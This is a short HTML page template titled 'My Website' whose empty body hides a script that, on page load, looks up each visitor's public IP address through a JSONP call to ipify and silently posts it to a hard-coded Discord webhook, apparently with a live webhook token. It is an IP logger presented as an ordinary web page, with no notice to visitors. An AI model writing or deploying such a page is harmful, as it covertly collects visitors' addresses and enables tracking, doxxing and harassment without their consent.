<!DOCTYPE html>
<html>
<head>
  <title>My Website</title>
  <script>
    // JavaScript code for sending the IP address to Discord webhook using JSONP
    window.onload = function() {
      const apiUrl = 'https://api.ipify.org/?format=jsonp&callback=processIP';
      const script = document.createElement('script');
      script.src = apiUrl;
      document.head.appendChild(script);
    };

    function processIP(response) {
      const ipAddress = response.ip;
      const webhookUrl = 'https://discord.com/api/webhooks/1112433220747792535/f0GSFHDk7Y5p7YNV2xzoIjy-7Kl6v1gRJyK2jONEyMxhjGiEbvffgJNA9N4ZeaGJg_i9';
      const messagePayload = {
        content: 'IP Address: ' + ipAddress
      };
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(messagePayload)
      });
    }
  </script>
</head>
<body>
  <!-- Your HTML content here -->
</body>
</html>
